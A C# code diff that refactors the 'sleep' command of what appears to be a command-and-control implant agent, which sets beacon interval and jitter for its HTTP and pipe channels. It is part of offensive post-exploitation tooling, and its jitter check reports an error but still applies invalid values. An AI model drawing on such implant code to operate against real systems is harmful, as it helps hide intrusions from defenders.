@@ -12,11 +12,11 @@ namespace Agent.Commands
     {
         public override string Name => "sleep";
 
-        public override void InnerExecute(AgentTask task, Models.Agent agent, AgentTaskResult result, MessageManager commm)
+        public override void InnerExecute(AgentTask task, AgentCommandContext context)
         {
             if (task.SplittedArgs.Count() == 0)
             {
-                result.Result = $"Delay is {agent.HttpCommunicator.Interval/1000}s +/- {agent.HttpCommunicator.Jitter*100}%";
+                context.Result.Result = $"Delay is {context.Agent.HttpCommunicator.Interval/1000}s +/- {context.Agent.HttpCommunicator.Jitter*100}%";
                 return;
             }
 
@@ -29,18 +29,18 @@ namespace Agent.Commands
 
             if(jitter < 0 || jitter >= 1)
             {
-                result.Result = "Jitter is not correct (should be 0-99%)";
+                context.Result.Result = "Jitter is not correct (should be 0-99%)";
             }
 
          
             delay = delay * 1000;
-            agent.HttpCommunicator.Interval = delay;
-            agent.HttpCommunicator.Jitter = jitter;
+            context.Agent.HttpCommunicator.Interval = delay;
+            context.Agent.HttpCommunicator.Jitter = jitter;
 
-            agent.PipeCommunicator.Interval = delay;
-            agent.PipeCommunicator.Jitter = jitter;
+            context.Agent.PipeCommunicator.Interval = delay;
+            context.Agent.PipeCommunicator.Jitter = jitter;
 
-            result.Result = $"Delay set to {delay/1000}s +/- {jitter*100}%";
+            context.Result.Result = $"Delay set to {delay/1000}s +/- {jitter*100}%";
         }
     }
 }
